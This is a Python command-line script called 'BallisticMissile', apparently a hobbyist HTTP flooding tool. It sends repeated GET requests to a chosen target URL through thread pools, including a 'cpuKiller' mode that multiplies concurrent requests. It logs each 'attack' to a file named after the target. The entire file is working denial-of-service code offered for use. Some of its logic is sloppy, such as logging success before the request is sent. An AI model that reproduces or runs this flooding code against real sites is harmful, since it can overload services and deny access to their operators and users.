#!/usr/bin/env python3

import argparse
import requests
import os
import os.path
from os import path
from datetime import date
from multiprocessing.pool import ThreadPool
import json
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", dest="targete", default="https://google.com", help="set target default is "
                                                                                         "https://google.com")
parser.add_argument("-a", "--attacks", dest="attacks", default="1", help="the amount of attacks")
parser.add_argument("-m", "--multi", dest="multi", default="1", help="run a attacks multiple times")
args = parser.parse_args()
yesses = ["yes", "yEs", "yeS", "Yes", "YES", "\n", "y", "Y", ""]

nower = date.today()
nowere = str(nower.strftime("%h:%m:%s"))

cfg = open("./config.json")
target = str(args.targete.replace("https://", ""))
cfgR = json.load(cfg)


def startup():
    if path.exists("./attacks"):
        theFile = open(f"./attacks/{target}.txt", "w+")
        theFile.writelines(f"CREATED FILE\n")
        cli()
    else:
        os.mkdir("./attacks")
        theFile = open(f"attacks/{target}.txt", "w+")
        theFile.writelines(f"CREATED FILE\n")
        cli()


def cli():
    global un
    confirm = input(f"BallisticMissile is performing a attack on target: {args.targete}. Is this OK? (yes) ")
    if confirm in yesses:
        theFilder1 = open(f"./attacks/{target}.txt", "a+")
        theFilder1.writelines(f"[{nowere}] => Running attack on target: {args.targete}\n")
        p = ThreadPool(cfgR["ThreadPool"])
        print(args.multi)
        if args.multi == "1":
            if cfgR["cpuKiller"]:
                expection("cpuKiller is activated. While this is active you can only make 2 or more attacks at the "
                          "same time", True)
            else:
                app(1)
        elif int(args.multi) < 1:
            print(f"{args.multi} stacks is a invalid count (2 or more are allowed)")
            exit()
        pool_output = p.map(app, range(int(int(args.multi) / 2)))
        print(pool_output)
    else:
        print("attack aborted")
        exit()


def app(x):
    runHttpAttack()
    return int(x) * int(x)


def runHttpAttack():
    global pool_outpute
    x = 0
    if not cfgR["cpuKiller"]:
        while x < int(args.attacks):
            x += 1
            # r = requests.get(url=args.targete)
            theFiler2 = open(f"./attacks/{target}.txt", "a+")
            theFiler2.writelines(f"[{nowere}] => Attack number {x} successfully\n")
            theFiler2.writelines(f"[{nowere}] => {x} attacks completed\n")
            session = requests.Session()
            retry = Retry(connect=cfgR["retry"], backoff_factor=0.5)
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            session.get(args.targete)
            time.sleep(float(cfgR["delay"]))
        print(f"stack of {args.attacks} completed")
    elif cfgR["cpuKiller"]:
        while x < int(args.attacks):
            x += 1
            pe = ThreadPool(cfgR["cpuKillerThreadPool"])
            pool_outpute = pe.map(cpuKiller, range(int(int(args.multi) / 2)))
            time.sleep(float(cfgR["delay"]))
        print(pool_outpute)


def cpuKiller(x):
    session = requests.Session()
    retry = Retry(connect=cfgR["retry"], backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.get(args.targete)
    # r = requests.get(url=args.targete)
    theFiler2 = open(f"./attacks/{target}.txt", "a+")
    theFiler2.writelines(f"[{nowere}] => Attack number {x} successfully\n")
    theFiler2.writelines(f"[{nowere}] => {x} attacks completed\n")
    return x * x


def expection(msg, ext):
    print(f"[{nowere.lower()}] ERROR => {msg}")
    if ext:
        exit()


startup()
